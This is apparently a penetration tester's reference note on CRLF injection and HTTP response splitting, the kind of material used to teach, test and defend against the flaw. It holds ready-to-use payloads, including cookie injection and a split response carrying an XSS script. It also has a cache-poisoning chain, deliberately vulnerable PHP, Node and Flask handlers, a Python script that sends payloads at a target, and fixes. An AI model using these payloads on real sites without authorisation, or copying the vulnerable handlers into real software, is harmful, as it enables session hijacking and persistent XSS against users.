# CRLF Injection & HTTP Response Splitting

**Tags:** #medium #high #crlf #header-injection #cache-poisoning
**OWASP:** A03:2021 Injection
**CVSS Base:** 5.4 (Medium isolated) → 8.0 (High in chain with cache poisoning)

---

## 📖 What is it

When user input is reflected in **HTTP headers** without removing `\r\n` (CR LF), the attacker can inject additional headers or split the HTTP response into two — creating a complete forged response.

---

## 🔍 `grep_search` Tactics

```
header(
setHeader(
Response.AddHeader(
addHeader(
resp.writeHead(
redirect(
Location:
Set-Cookie:
```

**What to check:** user input is passed to any of these without filtering `\r\n` and `%0d%0a`.

---

## 💣 CRLF Payloads

### URL Encoded
```
%0d%0a   → \r\n (literal)
%0a      → \n only (works on some servers)
%0D%0A   → uppercase also works
```

### Simple Header Injection

```
GET /redirect?url=https://example.com%0d%0aX-Injected-Header:value HTTP/1.1
```

**Injected response:**
```http
HTTP/1.1 302 Found
Location: https://example.com
X-Injected-Header: value       ← injected by the attacker!
```

### Session Cookie Injection

```
GET /redirect?url=https://legit.com%0d%0aSet-Cookie:session=ATTACKER_SESSION HTTP/1.1
```

**Response:**
```http
HTTP/1.1 302 Found
Location: https://legit.com
Set-Cookie: session=ATTACKER_SESSION     ← attacker's session cookie!
```

---

## 💣 HTTP Response Splitting

**Injecting two `\r\n\r\n`** splits the response into two complete HTTP responses:

```
GET /redirect?url=https://trusted.com%0d%0a%0d%0aHTTP/1.1+200+OK%0d%0aContent-Type:+text/html%0d%0a%0d%0a<script>alert(document.cookie)</script>
```

**Server response:**
```http
HTTP/1.1 302 Found
Location: https://trusted.com

HTTP/1.1 200 OK
Content-Type: text/html

<script>alert(document.cookie)</script>
```

The proxy/browser may interpret the second part as a second HTTP response — effectively an XSS via header injection.

---

## 💣 Cache Poisoning via CRLF

**The most dangerous attack:** when an intermediate cache (CDN, reverse proxy) caches the injected "second response", it is served to all subsequent users accessing that URL.

```
1. Attacker sends a request with CRLF that injects a response with an XSS payload
2. CDN caches the injected response
3. All users accessing the URL receive the cached payload
4. Persistent XSS for everyone → no database compromise needed
```

---

## 🎯 Injection Contexts

### PHP — header()

```php
//  VULNERABLE
$url = $_GET['url'];
header("Location: " . $url);  // $url may contain \r\n
```

### Node.js — res.setHeader()

```javascript
//  VULNERABLE
app.get('/redirect', (req, res) => {
    const url = req.query.url;
    res.setHeader('Location', url);    // url may contain \r\n
    res.status(302).end();
});
```

### Python — Flask

```python
#  VULNERABLE — log line or manual header
@app.get('/redirect')
def redirect_to():
    url = request.args.get('url')
    response = make_response('', 302)
    response.headers['Location'] = url   # url may contain \r\n
    return response
```

---

## 🧪 Validation Script

```python
# .tmp/validate_crlf.py
import requests

TARGET = "http://target.com"
ENDPOINT = "/redirect"
PARAM = "url"

PAYLOADS = [
    "https://legit.com\r\nX-Injected: pwned",
    "https://legit.com\nX-Injected: pwned",
    "https://legit.com%0d%0aX-Injected: pwned",
    "https://legit.com%0aX-Injected: pwned",
    "https://legit.com%0d%0aSet-Cookie: admin=true",
]

for payload in PAYLOADS:
    r = requests.get(f"{TARGET}{ENDPOINT}", params={PARAM: payload},
                     allow_redirects=False, timeout=10)
    
    headers_str = str(r.headers)
    if 'X-Injected' in headers_str or 'admin=true' in headers_str:
        print(f"[🔴 VULN] CRLF Injection confirmed!")
        print(f"  Payload: {payload!r}")
        print(f"  Injected headers: {r.headers}")
    else:
        print(f"[ok] {payload[:50]!r} → {r.status_code}")
```

---

## 🛡️ Fix

```php
//  CORRECT — remove \r and \n before using in header
$url = str_replace(["\r", "\n"], '', $_GET['url']);
header("Location: " . $url);

//  CORRECT — use built-in redirect functions that already sanitize
header("Location: " . filter_var($url, FILTER_SANITIZE_URL));
```

```javascript
//  CORRECT — Node.js: Express already sanitizes in versions >= 4.x
// But if using setHeader manually:
const url = req.query.url.replace(/[\r\n]/g, '');
res.setHeader('Location', url);

//  BETTER — use res.redirect() which protects automatically
res.redirect(302, url);
```

```python
#  CORRECT — Python Flask (redirect already sanitizes)
from flask import redirect, url_for

@app.get('/redirect')
def safe_redirect():
    url = request.args.get('url', '/')
    # Remove CRLF manually if using custom headers
    url = url.replace('\r', '').replace('\n', '')
    return redirect(url)
```

---

## 🔗 Chain Exploits

```
CRLF Injection + Cache Poisoning → Persistent XSS for everyone via CDN
CRLF + Set-Cookie injection → Session Fixation → Account Takeover
CRLF + Location header → Open Redirect via injected header
CRLF + Response Splitting + JavaScript → Full XSS via header injection
CRLF + Log injection → Forge audit log entries
```

---

## 📌 References
- [[xss-cross-site-scripting]]
- [[open-redirect]]
- [[http-security-headers]]
- [OWASP CRLF Injection](https://owasp.org/www-community/attacks/CRLF_Injection)
- [HackTricks CRLF](https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a)